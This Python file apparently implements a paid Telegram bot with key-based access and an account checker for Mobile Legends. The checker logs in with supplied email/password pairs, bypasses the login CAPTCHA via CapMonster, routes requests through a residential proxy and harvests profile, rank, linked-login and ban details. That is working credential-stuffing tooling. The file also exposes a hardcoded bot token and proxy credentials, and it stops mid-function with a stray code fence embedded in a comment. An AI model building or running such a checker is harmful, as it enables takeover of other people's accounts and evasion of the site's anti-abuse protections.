#!/usr/bin/env python3
"""
Combined Telegram bot with admin controls and user management.
All functionality in a single file for easy deployment.
"""

import asyncio
import json
import logging
import os
import uuid
import tempfile
import io
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from dotenv import load_dotenv
import requests
import hashlib
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from aiohttp import web, web_runner

from telegram import Update, BotCommand, MenuButtonCommands
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.error import TelegramError

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

class BotConfig:
    """Bot configuration class."""

    # Bot settings
    BOT_TOKEN = os.getenv('BOT_TOKEN', '8342752247:AAGV9CmGu-qd7wCdclWNSbO_qmzA7hgfYmk')

    # Admin settings
    ADMIN_IDS = []
    admin_ids_str = os.getenv('ADMIN_IDS', '7410975556')
    if admin_ids_str:
        try:
            ADMIN_IDS = [int(id.strip()) for id in admin_ids_str.split(',') if id.strip()]
        except ValueError:
            ADMIN_IDS = []

    # File paths
    KEYS_FILE = os.getenv('KEYS_FILE', 'keys.json')
    USERS_FILE = os.getenv('USERS_FILE', 'users.json')
    LOG_FILE = os.getenv('LOG_FILE', 'bot.log')

    # Key settings
    VALID_KEY_DURATIONS = [1, 3, 7]  # days

    # Rate limiting
    BROADCAST_DELAY = float(os.getenv('BROADCAST_DELAY', '0.1'))  # seconds between messages

    @classmethod
    def validate_config(cls) -> List[str]:
        """Validate configuration and return any errors."""
        errors = []

        if not cls.BOT_TOKEN:
            errors.append("BOT_TOKEN is required")

        if not cls.ADMIN_IDS:
            errors.append("At least one ADMIN_ID is required")

        return errors

class CapMonsterManager:
    """CapMonster API management system."""

    def __init__(self, data_file: str = "capmonster_keys.json"):
        self.data_file = data_file
        self.keys = self._load_keys()

    def _load_keys(self) -> Dict:
        """Load CapMonster API keys from JSON file."""
        try:
            with open(self.data_file, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            logger.info(f"Creating new CapMonster keys file: {self.data_file}")
            return {}

    def _save_keys(self):
        """Save CapMonster API keys to JSON file."""
        try:
            with open(self.data_file, 'w') as f:
                json.dump(self.keys, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving CapMonster keys: {e}")

    def set_api_key(self, user_id: int, api_key: str):
        """Set CapMonster API key for a user."""
        user_id_str = str(user_id)
        self.keys[user_id_str] = {
            'api_key': api_key,
            'set_at': datetime.now().isoformat()
        }
        self._save_keys()
        logger.info(f"Set CapMonster API key for user {user_id}")

    def get_api_key(self, user_id: int) -> Optional[str]:
        """Get CapMonster API key for a user."""
        user_id_str = str(user_id)
        if user_id_str in self.keys:
            return self.keys[user_id_str]['api_key']
        return None

    def get_balance(self, user_id: int) -> Optional[float]:
        """Get CapMonster balance for a user."""
        api_key = self.get_api_key(user_id)
        if not api_key:
            return None

        try:
            response = requests.post('https://api.capmonster.cloud/getBalance', 
                                   json={"clientKey": api_key}, 
                                   timeout=10)
            data = response.json()

            if data.get('errorId') == 0:
                return data.get('balance')
            else:
                logger.error(f"CapMonster API error: {data.get('errorDescription')}")
                return None
        except Exception as e:
            logger.error(f"Error getting CapMonster balance: {e}")
            return None

class DataManager:
    """Data management system for user tracking and storage."""

    def __init__(self, data_file: str = "users.json"):
        self.data_file = data_file
        self.users = self._load_users()

    def _load_users(self) -> Dict:
        """Load users from JSON file."""
        try:
            with open(self.data_file, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            logger.info(f"Creating new users file: {self.data_file}")
            return {}

    def _save_users(self):
        """Save users to JSON file."""
        try:
            with open(self.data_file, 'w') as f:
                json.dump(self.users, f, indent=2, default=str)
        except Exception as e:
            logger.error(f"Error saving users: {e}")

    def add_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None):
        """Add or update user information."""
        user_id_str = str(user_id)
        now = datetime.now().isoformat()

        if user_id_str in self.users:
            # Update existing user
            user_data = self.users[user_id_str]
            user_data['last_seen'] = now
            if username:
                user_data['username'] = username
            if first_name:
                user_data['first_name'] = first_name
            if last_name:
                user_data['last_name'] = last_name
            user_data['interaction_count'] = user_data.get('interaction_count', 0) + 1
        else:
            # Create new user
            user_data = {
                'user_id': user_id,
                'username': username,
                'first_name': first_name,
                'last_name': last_name,
                'first_seen': now,
                'last_seen': now,
                'interaction_count': 1
            }
            self.users[user_id_str] = user_data
            logger.info(f"Added new user: {user_id} (@{username})")

        self._save_users()

    def get_user(self, user_id: int) -> Optional[Dict]:
        """Get user information by ID."""
        user_id_str = str(user_id)
        return self.users.get(user_id_str)

    def get_all_users(self) -> List[Dict]:
        """Get all users."""
        return list(self.users.values())

    def update_user_activity(self, user_id: int):
        """Update user's last seen timestamp."""
        user_id_str = str(user_id)
        if user_id_str in self.users:
            self.users[user_id_str]['last_seen'] = datetime.now().isoformat()
            self.users[user_id_str]['interaction_count'] = self.users[user_id_str].get('interaction_count', 0) + 1
            self._save_users()

class KeyManager:
    """Key management system for handling access keys with expiration."""

    def __init__(self, data_file: str = "keys.json"):
        self.data_file = data_file
        self.keys = self._load_keys()

    def _load_keys(self) -> Dict:
        """Load keys from JSON file."""
        try:
            with open(self.data_file, 'r') as f:
                data = json.load(f)
                # Clean up expired keys on load
                self._cleanup_expired_keys(data)
                return data
        except (FileNotFoundError, json.JSONDecodeError):
            logger.info(f"Creating new keys file: {self.data_file}")
            # Initialize with proper structure
            initial_data = {"pending_keys": {}}
            with open(self.data_file, 'w') as f:
                json.dump(initial_data, f, indent=2)
            return initial_data

    def _save_keys(self):
        """Save keys to JSON file."""
        try:
            # Ensure the directory exists
            os.makedirs(os.path.dirname(self.data_file) if os.path.dirname(self.data_file) else '.', exist_ok=True)

            with open(self.data_file, 'w') as f:
                json.dump(self.keys, f, indent=2, default=str)
            logger.debug(f"Keys saved successfully to {self.data_file}")
        except Exception as e:
            logger.error(f"Error saving keys: {e}")
            raise e

    def _cleanup_expired_keys(self, keys_data: Dict = None):
        """Remove expired keys from data."""
        if keys_data is None:
            keys_data = self.keys

        now = datetime.now()
        expired_users = []
        expired_pending = []

        # Clean up active user keys
        for user_id, key_data in keys_data.items():
            if user_id == 'pending_keys':
                continue  # Skip the pending_keys dictionary itself

            try:
                expires_at = datetime.fromisoformat(key_data['expires_at'])
                if expires_at <= now:
                    expired_users.append(user_id)
            except (KeyError, ValueError) as e:
                logger.warning(f"Invalid key data for user {user_id}: {e}")
                expired_users.append(user_id)

        # Clean up pending keys
        if 'pending_keys' in keys_data:
            for key_id, key_data in keys_data['pending_keys'].items():
                try:
                    expires_at = datetime.fromisoformat(key_data['expires_at'])
                    if expires_at <= now:
                        expired_pending.append(key_id)
                except (KeyError, ValueError) as e:
                    logger.warning(f"Invalid pending key data for key {key_id}: {e}")
                    expired_pending.append(key_id)

        # Remove expired user keys
        for user_id in expired_users:
            del keys_data[user_id]
            logger.info(f"Cleaned up expired key for user {user_id}")

        # Remove expired pending keys
        for key_id in expired_pending:
            del keys_data['pending_keys'][key_id]
            logger.info(f"Cleaned up expired pending key {key_id}")

        if expired_users or expired_pending:
            self._save_keys()

    def generate_key(self, days: int) -> Tuple[str, datetime]:
        """Generate a new access key."""
        if days not in [1, 3, 7]:
            raise ValueError("Duration must be 1, 3, or 7 days")

        key_id = str(uuid.uuid4())
        now = datetime.now()
        expires_at = now + timedelta(days=days)

        key_data = {
            'key_id': key_id,
            'created_at': now.isoformat(),
            'expires_at': expires_at.isoformat(),
            'days_duration': days,
            'status': 'pending',
            'user_id': None
        }

        # Ensure pending_keys exists
        if 'pending_keys' not in self.keys:
            self.keys['pending_keys'] = {}

        self.keys['pending_keys'][key_id] = key_data
        logger.info(f"Storing key {key_id} in pending_keys")
        logger.debug(f"Current keys structure: {list(self.keys.keys())}")
        self._save_keys()

        logger.info(f"Generated key {key_id} valid for {days} days")
        return key_id, expires_at

    def activate_key(self, key_id: str, user_id: int) -> bool:
        """Activate a pending key for a specific user."""
        # Clean up expired keys first
        self._cleanup_expired_keys()

        # Check pending keys
        if 'pending_keys' not in self.keys:
            self.keys['pending_keys'] = {}
            self._save_keys()

        if key_id not in self.keys['pending_keys']:
            logger.warning(f"Key {key_id} not found in pending keys")
            logger.debug(f"Available pending keys: {list(self.keys['pending_keys'].keys())}")
            return False

        key_data = self.keys['pending_keys'][key_id]

        # Check if key is expired
        expires_at = datetime.fromisoformat(key_data['expires_at'])
        if expires_at <= datetime.now():
            # Remove expired pending key
            del self.keys['pending_keys'][key_id]
            self._save_keys()
            logger.warning(f"Key {key_id} is expired")
            return False

        # Remove any existing key for this user
        user_id_str = str(user_id)
        if user_id_str in self.keys:
            logger.info(f"Replacing existing key for user {user_id}")
            del self.keys[user_id_str]

        # Activate the key
        key_data['user_id'] = user_id
        key_data['status'] = 'active'
        key_data['activated_at'] = datetime.now().isoformat()

        # Move from pending to active
        self.keys[user_id_str] = key_data
        del self.keys['pending_keys'][key_id]

        self._save_keys()
        logger.info(f"Successfully activated key {key_id} for user {user_id}")
        return True

    def is_key_valid(self, user_id: int) -> bool:
        """Check if user has a valid (non-expired) key."""
        self._cleanup_expired_keys()
        user_id_str = str(user_id)

        if user_id_str not in self.keys:
            return False

        key_data = self.keys[user_id_str]

        try:
            expires_at = datetime.fromisoformat(key_data['expires_at'])
            return expires_at > datetime.now() and key_data.get('status') == 'active'
        except (KeyError, ValueError):
            return False

    def get_key_info(self, user_id: int) -> Optional[Dict]:
        """Get key information for a user."""
        self._cleanup_expired_keys()
        user_id_str = str(user_id)

        if user_id_str in self.keys:
            return self.keys[user_id_str].copy()
        return None

    def revoke_key(self, user_id: int) -> bool:
        """Revoke a user's key."""
        user_id_str = str(user_id)

        if user_id_str in self.keys:
            self.keys[user_id_str]['status'] = 'revoked'
            self.keys[user_id_str]['revoked_at'] = datetime.now().isoformat()
            # Remove the key entirely
            del self.keys[user_id_str]
            self._save_keys()
            logger.info(f"Revoked key for user {user_id}")
            return True
        return False

    def get_all_keys(self) -> List[Dict]:
        """Get all keys (active and expired)."""
        self._cleanup_expired_keys()

        all_keys = []

        # Add active user keys
        for user_id, key_data in self.keys.items():
            if user_id != 'pending_keys':
                key_copy = key_data.copy()
                key_copy['user_id'] = int(user_id)
                all_keys.append(key_copy)

        # Add pending keys
        if 'pending_keys' in self.keys:
            for key_id, key_data in self.keys['pending_keys'].items():
                key_copy = key_data.copy()
                key_copy['status'] = 'pending'
                all_keys.append(key_copy)

        # Sort by creation date (newest first)
        all_keys.sort(key=lambda x: x['created_at'], reverse=True)
        return all_keys

class AccountChecker:
    """Account checking functionality from info.py."""

    def __init__(self, capmonster_api_key: str):
        self.capmonster_api_key = capmonster_api_key
        self.SITE_URL = 'https://play.mobilelegends.com/tools/deleteaccount/login'
        self.ACCOUNT_API = 'https://accountmtapi.mobilelegends.com/'
        self.USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'

        # Rank ranges for display
        self.RANK_RANGES = [
            {"min": 0, "max": 4, "rank": "Warrior III"},
            {"min": 5, "max": 9, "rank": "Warrior II"},
            {"min": 10, "max": 14, "rank": "Warrior I"},
            {"min": 15, "max": 19, "rank": "Elite IV"},
            {"min": 20, "max": 24, "rank": "Elite III"},
            {"min": 25, "max": 29, "rank": "Elite II"},
            {"min": 30, "max": 34, "rank": "Elite I"},
            {"min": 35, "max": 39, "rank": "Master IV"},
            {"min": 40, "max": 44, "rank": "Master III"},
            {"min": 45, "max": 49, "rank": "Master II"},
            {"min": 50, "max": 54, "rank": "Master I"},
            {"min": 55, "max": 59, "rank": "Grandmaster IV"},
            {"min": 60, "max": 64, "rank": "Grandmaster III"},
            {"min": 65, "max": 69, "rank": "Grandmaster II"},
            {"min": 70, "max": 74, "rank": "Grandmaster I"},
            {"min": 75, "max": 79, "rank": "Epic IV"},
            {"min": 80, "max": 84, "rank": "Epic III"},
            {"min": 85, "max": 89, "rank": "Epic II"},
            {"min": 90, "max": 94, "rank": "Epic I"},
            {"min": 95, "max": 99, "rank": "Legend IV"},
            {"min": 100, "max": 104, "rank": "Legend III"},
            {"min": 105, "max": 109, "rank": "Legend II"},
            {"min": 110, "max": 114, "rank": "Legend I"},
            {"min": 115, "max": 119, "rank": "Mythic V"},
            {"min": 120, "max": 124, "rank": "Mythic IV"},
            {"min": 125, "max": 129, "rank": "Mythic III"},
            {"min": 130, "max": 134, "rank": "Mythic II"},
            {"min": 135, "max": 139, "rank": "Mythic I"},
            {"min": 140, "max": 199, "rank": "Mythical Honor"},
            {"min": 200, "max": 999, "rank": "Mythical Glory"}
        ]

    def create_proxy_session(self):
        """Create optimized session with proxy and better configuration."""
        session = requests.Session()
        session.proxies = {
            "http": "http://262ceb93fc50f42b5029__cr.us,th:10f2c09b5217890c@gw.dataimpulse.com:823",
            "https": "http://262ceb93fc50f42b5029__cr.us,th:10f2c09b5217890c@gw.dataimpulse.com:823"
        }

        # High-performance adapter configuration
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=20,
            pool_maxsize=50,
            max_retries=requests.adapters.Retry(
                total=1,
                backoff_factor=0.3,
                status_forcelist=[500, 502, 503, 504]
            )
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)

        session.headers.update({
            'User-Agent': self.USER_AGENT,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        })

        return session

    def md5(self, data):
        """MD5 hash function."""
        return hashlib.md5(data.encode()).hexdigest()

    def generate_sign(self, username, hashed_pwd, cn31):
        """Generate sign for login."""
        string_to_hash = f"account={username}&e_captcha={cn31}&md5pwd={hashed_pwd}&op=login_captcha"
        return self.md5(string_to_hash)

    def get_rank_name(self, history_rank_level):
        """Get rank name from level."""
        try:
            history_rank_level = int(history_rank_level)
            for rank in self.RANK_RANGES:
                if rank["min"] <= history_rank_level <= rank["max"]:
                    return rank["rank"]
            return "Unknown"
        except:
            return "Unranked"

    def solve_cn31(self, max_retries=2):
        """Solve CAPTCHA using CapMonster with enhanced stability and speed."""
        for retry in range(max_retries):
            task_id = None
            try:
                # Create task with optimized settings
                create_payload = {
                    "clientKey": self.capmonster_api_key,
                    "task": {
                        "type": "YidunTask",
                        "websiteURL": self.SITE_URL,
                        "websiteKey": "fef5c67c39074e9d845f4bf579cc07af",
                        "userAgent": self.USER_AGENT,
                        "proxyType": "http",
                        "proxyAddress": "gw.dataimpulse.com",
                        "proxyPort": 823,
                        "proxyLogin": "262ceb93fc50f42b5029",
                        "proxyPassword": "10f2c09b5217890c"
                    }
                }

                try:
                    task_response = requests.post(
                        'https://api.capmonster.cloud/createTask', 
                        json=create_payload, 
                        timeout=4
                    )
                    task_create = task_response.json()
                except requests.exceptions.Timeout:
                    if retry < max_retries - 1:
                        time.sleep(0.1)
                        continue
                    raise Exception("Task creation timeout")
                except Exception as e:
                    if retry < max_retries - 1:
                        time.sleep(0.1)
                        continue
                    raise Exception(f"Task creation failed: {str(e)[:30]}")

                if task_create.get('errorId') != 0:
                    error_desc = task_create.get('errorDescription', 'Unknown error')
                    if retry < max_retries - 1:
                        time.sleep(0.2)
                        continue
                    raise Exception(f"CapMonster Error: {error_desc[:50]}")

                task_id = task_create.get('taskId')
                if not task_id:
                    if retry < max_retries - 1:
                        continue
                    raise Exception("No task ID received")

                # Optimized polling with exponential backoff
                check_intervals = [0.5, 0.7, 0.8, 1.0, 1.2, 1.5] + [2.0] * 15  # Start fast, then slower

                for i, interval in enumerate(check_intervals):
                    time.sleep(interval)

                    try:
                        result_response = requests.post(
                            'https://api.capmonster.cloud/getTaskResult', 
                            json={
                                "clientKey": self.capmonster_api_key,
                                "taskId": task_id
                            }, 
                            timeout=4
                        )
                        task_result = result_response.json()
                    except requests.exceptions.Timeout:
                        if i < len(check_intervals) - 1:
                            continue
                        if retry < max_retries - 1:
                            break
                        raise Exception("Result check timeout")
                    except Exception:
                        if i < len(check_intervals) - 1:
                            continue
                        if retry < max_retries - 1:
                            break
                        raise Exception("Result check failed")

                    status = task_result.get('status', '')

                    if status == 'ready':
                        solution = task_result.get('solution', {})
                        token = solution.get('token')
                        if token:
                            return token
                        else:
                            if retry < max_retries - 1:
                                break
                            raise Exception("No token in solution")

                    elif status == 'failed':
                        error_desc = task_result.get('errorDescription', 'Unknown error')
                        if retry < max_retries - 1:
                            break
                        raise Exception(f"CAPTCHA failed: {error_desc[:50]}")

                    elif status not in ['processing', 'pending']:
                        if retry < max_retries - 1:
                            break
                        raise Exception(f"Unexpected status: {status}")

                # If we reach here, the task timed out
                if retry < max_retries - 1:
                    time.sleep(0.1)
                    continue

            except requests.exceptions.RequestException as e:
                if retry < max_retries - 1:
                    time.sleep(0.2)
                    continue
                raise Exception(f"Network error: {str(e)[:30]}")
            except Exception as e:
                if retry < max_retries - 1:
                    time.sleep(0.1)
                    continue
                raise e

        raise Exception("CAPTCHA solve failed after all retries")

    def check_account_simple(self, email, password):
        """Optimized account check with enhanced stability and error handling."""
        session = None

        try:
            session = self.create_proxy_session()

            # Get CAPTCHA token with improved error handling
            try:
                cn31_token = self.solve_cn31()
            except Exception as e:
                return {"status": "invalid", "reason": f"CAPTCHA failed: {str(e)[:30]}"}

            hashed_pwd = self.md5(password)
            sign = self.generate_sign(email, hashed_pwd, cn31_token)

            login_payload = {
                "lang": "en",
                "op": "login_captcha",
                "sign": sign,
                "params": {
                    "account": email,
                    "md5pwd": hashed_pwd,
                    "e_captcha": cn31_token
                }
            }

            headers = {
                "User-Agent": self.USER_AGENT,
                "Origin": "https://play.mobilelegends.com",
                "Referer": "https://play.mobilelegends.com/",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*"
            }

            # Optimized timeout - balanced speed vs stability
            try:
                login_res = session.post(self.ACCOUNT_API, json=login_payload, headers=headers, timeout=5)
            except requests.exceptions.Timeout:
                return {"status": "invalid", "reason": "Login timeout"}
            except requests.exceptions.ConnectionError:
                return {"status": "invalid", "reason": "Connection failed"}

            if login_res.status_code != 200:
                return {"status": "invalid", "reason": f"HTTP {login_res.status_code}"}

            try:
                data = login_res.json()
            except json.JSONDecodeError:
                return {"status": "invalid", "reason": "Invalid response format"}

            message = data.get("message", "")

            if message == "Error_Success":
                login_data = data.get("data", {})
                guid = login_data.get("guid")
                sess = login_data.get("session")

                if not guid or not sess:
                    return {"status": "invalid", "reason": "Missing auth data"}

                # Get JWT token with retry logic
                jwt_token = None
                for attempt in range(2):
                    try:
                        jwt_token = self.get_token(guid, sess, session)
                        if jwt_token:
                            break
                    except:
                        if attempt == 0:
                            time.sleep(0.1)
                        continue

                if not jwt_token:
                    return {"status": "invalid", "reason": "JWT token failed"}

                # Get account info with timeout protection
                try:
                    account_info = self.get_info(jwt_token, session)
                    if not account_info:
                        return {"status": "invalid", "reason": "Account info failed"}
                except:
                    return {"status": "invalid", "reason": "Info retrieval failed"}

                # Get additional info in parallel with proper timeout handling
                bind_info = "N/A"
                ban_status = {"is_banned": False, "ban_info": None}

                try:
                    import concurrent.futures
                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                        bind_future = executor.submit(self.get_bind_info, jwt_token, session)
                        ban_future = executor.submit(self.check_ban_status, jwt_token, session)

                        try:
                            bind_info = bind_future.result(timeout=2)
                        except:
                            bind_info = "N/A"

                        try:
                            ban_status = ban_future.result(timeout=2)
                        except:
                            ban_status = {"is_banned": False, "ban_info": None}
                except:
                    # Fallback if parallel execution fails
                    try:
                        bind_info = self.get_bind_info(jwt_token, session)
                    except:
                        bind_info = "N/A"

                account_info["bind_info"] = bind_info

                if ban_status.get("is_banned", False):
                    return {"status": "banned", "info": account_info, "ban_info": ban_status.get("ban_info")}
                else:
                    return {"status": "valid", "info": account_info}

            elif "wrong" in message.lower() or "incorrect" in message.lower():
                return {"status": "invalid", "reason": "Wrong credentials"}
            elif "blocked" in message.lower() or "banned" in message.lower():
                return {"status": "invalid", "reason": "Account blocked"}
            else:
                return {"status": "invalid", "reason": f"Login error: {message[:30]}"}

        except requests.exceptions.Timeout:
            return {"status": "invalid", "reason": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "invalid", "reason": "Connection error"}
        except Exception as e:
            return {"status": "invalid", "reason": f"Error: {str(e)[:30]}"}
        finally:
            # Always close session```python
            if session:
                try:
                    session.close()
                except:
                    pass

    def get_token(self, guid, sess, session):
        """Get JWT token with faster timeout."""
        url = "https://api.mobilelegends.com/tools/deleteaccount/getToken"
        payload = {"id": guid, "token": sess, "type": "mt_And"}

        try:
            res = session.post(url, json=payload, timeout=4, verify=False)
            result = res.json()
            if result.get("status") == "success" and "data" in result:
                return result["data"].get("jwt")
            return None
        except:
            return None

    def get_info(self, jwt_token, session):
        """Get account info with faster timeout."""
        url = "https://sg-api.mobilelegends.com/base/getBaseInfo"
        headers = {
            'authorization': f'Bearer {jwt_token}',
            'content-type': 'application/json',
            'user-agent': self.USER_AGENT,
            'x-token': jwt_token
        }

        try:
            res = session.post(url, headers=headers, json={}, timeout=4, verify=False)
            if res.status_code != 200:
                return None

            data = res.json()
            if data.get("code") != 0:
                return None

            user = data.get("data", {})
            return {
                "nn": user.get("name", "N/A"),
                "reg": user.get("reg_country", "N/A"),
                "rid": user.get("roleId", "N/A"),
                "zid": user.get("zoneId", "N/A"),
                "pic": user.get("avatar", "N/A"),
                "lvl": user.get("level", "N/A"),
                "history_rank_level": user.get("history_rank_level", "N/A"),
                "rank_name": self.get_rank_name(user.get("history_rank_level", "N/A"))
            }
        except:
            return None

    def get_bind_info(self, jwt_token, session):
        """Get account bind information with faster timeout."""
        url = "https://api.mobilelegends.com/tools/deleteaccount/getCancelAccountInfo"
        headers = {
            'authorization': f'Bearer {jwt_token}',
            'content-type': 'application/json',
            'user-agent': self.USER_AGENT,
            'x-token': jwt_token,
            'origin': 'https://play.mobilelegends.com',
            'referer': 'https://play.mobilelegends.com/'
        }

        try:
            res = session.post(url, headers=headers, json={}, timeout=2, verify=False)
            if res.status_code != 200:
                return "N/A"

            data = res.json()
            if data.get("status") != "success" or data.get("code") != 0:
                return "N/A"

            bind_emails = data.get("data", {}).get("bind_email", [])

            bind_types = []
            for bind_type in bind_emails:
                if bind_type == "mt-and_":
                    bind_types.append("Moonton")
                elif bind_type == "gg_":
                    bind_types.append("Google")
                elif bind_type == "fb-and_":
                    bind_types.append("Facebook")

            if bind_types:
                return ", ".join(bind_types)
            return "None"
        except:
            return "N/A"

    def check_ban_status(self, jwt_token, session):
        """Check if account is banned with faster timeout."""
        url = "https://api.mobilelegends.com/tools/selfservice/punishList"
        headers = {
            'authorization': f'Bearer {jwt_token}',
            'content-type': 'application/json',
            'user-agent': self.USER_AGENT,
            'x-token': jwt_token,
            'origin': 'https://play.mobilelegends.com',
            'referer': 'https://play.mobilelegends.com/'
        }

        payload = {"lang": "en"}

        try:
            res = session.post(url, headers=headers, json=payload, timeout=3, verify=False)
            if res.status_code != 200:
                return {"is_banned": False, "ban_info": None}

            response_data = res.json()

            if response_data.get("status") == "success" and response_data.get("code") == 0 and "data" in response_data:
                punishment_list = response_data["data"]

                if punishment_list and len(punishment_list) > 0:
                    active_bans = []
                    for punishment in punishment_list:
                        violation_time = punishment.get("violation_time", "")
                        unlock_time = punishment.get("unlock_time", "")

                        is_active = True
                        if unlock_time:
                            try:
                                from datetime import datetime
                                unlock_date = datetime.strptime(unlock_time, "%Y.%m.%d")
                                current_date = datetime.now()
                                is_active = current_date < unlock_date
                            except:
                                is_active = True

                        ban_info = {
                            "id": punishment.get("id", "Unknown"),
                            "reason": punishment.get("reason", "Unknown"),
                            "violation_time": violation_time,
                            "unlock_time": unlock_time,
                            "is_active": is_active
                        }

                        if ban_info["is_active"]:
                            active_bans.append(ban_info)

                    if active_bans:
                        return {"is_banned": True, "ban_info": active_bans}
                    else:
                        return {"is_banned": False, "ban_info": punishment_list}
                else:
                    return {"is_banned": False, "ban_info": None}
            else:
                return {"is_banned": False, "ban_info": None}

        except Exception as e:
            return {"is_banned": False, "ban_info": None}

    def check_account_with_token(self, email, password, cn31_token):
        """Optimized account check with pre-solved CAPTCHA."""
        session = None

        try:
            session = self.create_proxy_session()

            hashed_pwd = self.md5(password)
            sign = self.generate_sign(email, hashed_pwd, cn31_token)

            login_payload = {
                "lang": "en",
                "op": "login_captcha",
                "sign": sign,
                "params": {
                    "account": email,
                    "md5pwd": hashed_pwd,
                    "e_captcha": cn31_token
                }
            }

            headers = {
                "User-Agent": self.USER_AGENT,
                "Origin": "https://play.mobilelegends.com",
                "Referer": "https://play.mobilelegends.com/",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*"
            }

            try:
                login_res = session.post(self.ACCOUNT_API, json=login_payload, headers=headers, timeout=4)
            except requests.exceptions.Timeout:
                return {"status": "invalid", "reason": "Login timeout"}
            except requests.exceptions.ConnectionError:
                return {"status": "invalid", "reason": "Connection failed"}

            if login_res.status_code != 200:
                return {"status": "invalid", "reason": f"HTTP {login_res.status_code}"}

            try:
                data = login_res.json()
            except json.JSONDecodeError:
                return {"status": "invalid", "reason": "Invalid response format"}

            message = data.get("message", "")

            if message == "Error_Success":
                login_data = data.get("data", {})
                guid = login_data.get("guid")
                sess = login_data.get("session")

                if not guid or not sess:
                    return {"status": "invalid", "reason": "Missing auth data"}

                jwt_token = None
                for attempt in range(2):
                    try:
                        jwt_token = self.get_token(guid, sess, session)
                        if jwt_token:
                            break
                    except:
                        if attempt == 0:
                            time.sleep(0.1)
                        continue

                if not jwt_token:
                    return {"status": "invalid", "reason": "JWT token failed"}

                try:
                    account_info = self.get_info(jwt_token, session)
                    if not account_info:
                        return {"status": "invalid", "reason": "Account info failed"}
                except:
                    return {"status": "invalid", "reason": "Info retrieval failed"}

                bind_info = "N/A"
                ban_status = {"is_banned": False, "ban_info": None}

                try:
                    import concurrent.futures
                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                        bind_future = executor.submit(self.get_bind_info, jwt_token, session)
                        ban_future = executor.submit(self.check_ban_status, jwt_token, session)

                        try:
                            bind_info = bind_future.result(timeout=2)
                        except:
                            bind_info = "N/A"

                        try:
                            ban_status = ban_future.result(timeout=2)
                        except:
                            ban_status = {"is_banned": False, "ban_info": None}
                except:
                    try:
                        bind_info = self.get_bind_info(jwt_token, session)
                    except:
                        bind_info = "N/A"

                account_info["bind_info"] = bind_info

                if ban_status.get("is_banned", False):
                    return {"status": "banned", "info": account_info, "ban_info": ban_status.get("ban_info")}
                else:
                    return {"status": "valid", "info": account_info}

            elif "wrong" in message.lower() or "incorrect" in message.lower():
                return {"status": "invalid", "reason": "Wrong credentials"}
            elif "blocked" in message.lower() or "banned" in message.lower():
                return {"status": "invalid", "reason": "Account blocked"}
            else:
                return {"status": "invalid", "reason": f"Login error: {message[:30]}"}

        except requests.exceptions.Timeout:
            return {"status": "invalid", "reason": "Timeout"}
        except requests.exceptions.ConnectionError:
            return {"status": "invalid", "reason": "Connection error"}
        except Exception as e:
            return {"status": "invalid", "reason": f"Error: {str(e)[:30]}"}
        finally:
            if session:
                try:
                    session.close()
                except:
                    pass

    def check_account_simple_fast(self, email, password):
        """Optimized account check with enhanced stability and CAPTCHA on Demand."""
        session = None

        try:
            session = self.create_proxy_session()

            try:
                cn31_token = self.solve_cn31(max_retries=1)
            except Exception as e:
                return {"status": "invalid", "reason": f"CAPTCHA failed: {str(e)[:30]}"}

            hashed_pwd = self.md5(password)
            sign = self.generate_sign(email, hashed_pwd, cn31_token)

            login_payload = {
                "lang": "en",
                "op": "login_captcha",
                "sign": sign,
                "params": {
                    "account": email,
                    "md5pwd": hashed_pwd,
                    "e_captcha": cn31_token
                }
            }

            headers = {
                "User-Agent": self.USER_AGENT,
                "Origin": "https://play.mobilelegends.com",
                "Referer": "https://play.mobilelegends.com/",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*"
            }

            try:
                login_res = session.post(self.ACCOUNT_API, json=login_payload, headers=headers, timeout=4)
            except requests.exceptions.Timeout:
                return {"status": "invalid", "reason": "Login timeout"}
            except requests.exceptions.ConnectionError:
                return {"status": "invalid", "reason": "Connection failed"}

            if login_res.status_code != 200:
                return {"status": "invalid", "reason": f"HTTP {login_res.status_code}"}

            try:
                data = login_res.json()
            except json.JSONDecodeError:
                return {"status": "invalid", "reason": "Invalid response format"}

            message = data.get("message", "")

            if message == "Error_Success":
                login_data = data.get("data", {})
                guid = login_data.get("guid")
                sess = login_data.get("session")

                if not guid or not sess:
                    return {"status": "invalid", "reason": "Missing auth data"}

                jwt_token = None
                for attempt in range(2):
                    try:
                        jwt_token = self.get_token(guid, sess, session)
                        if jwt_token:
                            break
                    except:
                        if attempt == 0:
                            time.sleep(0.1)
                        continue

                if not jwt_token:
                    return {"status": "invalid", "reason": "JWT token failed"}

                try:
                    account_info = self.get_info(jwt_token, session)
                    if not account_info:
                        return {"status": "invalid", "reason": "Account info failed"}
                except:
                    return {"status": "invalid", "reason": "Info retrieval failed"}

                bind_info = "N/A"
                ban_status = {"is_banned": False, "ban_info": None}

                try:
                    import concurrent.futures
                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                        bind_future = executor.submit(self.get_bind_info, jwt_token, session)
                        ban_future = executor.submit(self.check_ban_status, jwt_token, session)

                        try:
                            bind_info = bind_future.result(timeout=2)
                        except:
                            bind_info = "N/A"

                        try:
                            ban_status = ban_future.result(timeout=2)
                        except:
                            ban_status = {"is_banned": False, "ban_info": None}
                except:
                    try:
